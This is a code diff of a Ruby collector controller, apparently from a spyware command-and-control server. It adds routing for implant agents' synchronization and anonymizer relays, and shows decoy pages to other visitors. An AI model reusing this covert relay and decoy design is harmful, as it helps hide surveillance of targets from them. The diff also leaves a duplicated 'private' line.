@@ -34,6 +34,17 @@ class CollectorController < RESTController
     return decoy_page
   end
 
+  def post
+    # this request comes from an anonymizer
+    return anon_proto if DB.instance.anon_cookies.include? @request[:http_cookie]
+
+    # the REST protocol for agent synchronization
+    content, content_type, cookie = Protocol.parse @request[:peer], @request[:uri], @request[:cookie], @request[:content], @request[:anon_version]
+    return decoy_page if content.nil?
+
+    return ok(content, {content_type: content_type, cookie: cookie})
+  end
+
   def push
     # only the DB is authorized to send PUSH commands
     unless from_db?(@request[:headers])
@@ -42,24 +53,22 @@ class CollectorController < RESTController
     end
 
     # Forward to rcs-controller
-    trace :debug, "Sending push instruction to the controller..."
+    trace :info, "[NC] Sending push instruction to the controller..."
 
-    controller_srv_port = Config.instance.global['CONTROLLER_PORT']
-    http = Net::HTTP.new("127.0.0.1", controller_srv_port)
-    # see the timeout around #check_element in rcs-controller
-    http.read_timeout = 300
-    resp = http.send_request('PUSH', '/', @request[:content], {})
+    resp = send_to_controller(@request)
 
     if resp.body == 'OK'
       trace :debug, "Network push succeed!"
+      return ok(resp.body, content_type: "text/html")
     else
       trace :error, "Network push failed: [#{resp.code}] #{resp.body}"
+      return server_error(resp.body, content_type: "text/html")
     end
 
-    return ok(resp.body, content_type: "text/html")
   rescue Exception => e
     trace :error, e.message
-    return ok(e.message, content_type: "text/html")
+    trace :debug, e.backtrace.join("\n")
+    return server_error(e.message, content_type: "text/html")
   end
 
   def put
@@ -102,12 +111,7 @@ class CollectorController < RESTController
     return ok("#{$version}", {content_type: "text/html"}) if $watchdog.lock
   end
 
-  def post
-    # the REST protocol for synchronization
-    content, content_type, cookie = Protocol.parse @request[:peer], @request[:uri], @request[:cookie], @request[:content], @request[:anon_version]
-    return decoy_page if content.nil?
-    return ok(content, {content_type: content_type, cookie: cookie})
-  end
+  private
 
   private
 
@@ -315,8 +319,6 @@ class CollectorController < RESTController
       major, minor = ver_tuple unless ver_tuple.empty?
       if major.to_i == 2
         version = 'v2'
-      elsif major.to_i == 4 and minor.to_i >= 4
-        version = 'kitkat'
       else
         version = 'default'
       end
@@ -373,6 +375,8 @@ class CollectorController < RESTController
   end
 
   def from_db?(headers)
+    return false unless headers
+
     # search the header for our X-Auth-Frontend value
     auth = headers[:x_auth_frontend]
     return false unless auth
@@ -384,6 +388,31 @@ class CollectorController < RESTController
     return true if sig == File.read(Config.instance.file('DB_SIGN'))
 
     return false
+  end
+
+  def send_to_controller(request)
+    controller_srv_port = Config.instance.global['CONTROLLER_PORT']
+    http = Net::HTTP.new("127.0.0.1", controller_srv_port)
+    http.read_timeout = 600
+    http.send_request(request[:method], request[:uri], request[:content], {'Cookie' => request[:http_cookie] || ''})
+  end
+
+  def anon_proto
+    trace :info, "[NC] [#{@request[:peer]}] Sending Anonymizer requests to the controller..."
+
+    resp = send_to_controller(@request)
+
+    if not resp.is_a? Net::HTTPSuccess
+      trace :error, "[NC]: #{resp.inspect} #{resp.body.inspect}"
+      return decoy_page
+    end
+
+    #trace :debug, "[NC]: #{resp.inspect} #{resp.body.inspect}"
+
+    return ok(resp.body)
+  rescue Exception => e
+    trace :error, "[NC] ERROR: #{e.message}"
+    return decoy_page
   end
 
 end # RCS::Controller::CollectorController
